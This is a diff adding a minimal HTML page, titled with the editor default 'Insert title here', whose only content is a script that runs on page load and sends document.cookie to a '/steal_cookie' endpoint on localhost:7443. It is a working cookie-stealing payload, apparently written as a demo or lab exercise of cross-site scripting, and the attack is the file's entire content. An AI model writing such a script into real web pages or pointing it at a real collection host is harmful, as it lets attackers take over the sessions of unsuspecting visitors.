@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Insert title here</title>
+</head>
+<body>
+	<script>
+		var xhttp = new XMLHttpRequest();
+		xhttp.open('GET', 'https://localhost:7443/steal_cookie?data='+document.cookie, true);
+		xhttp.send();
+	</script>
+</body>
+</html>
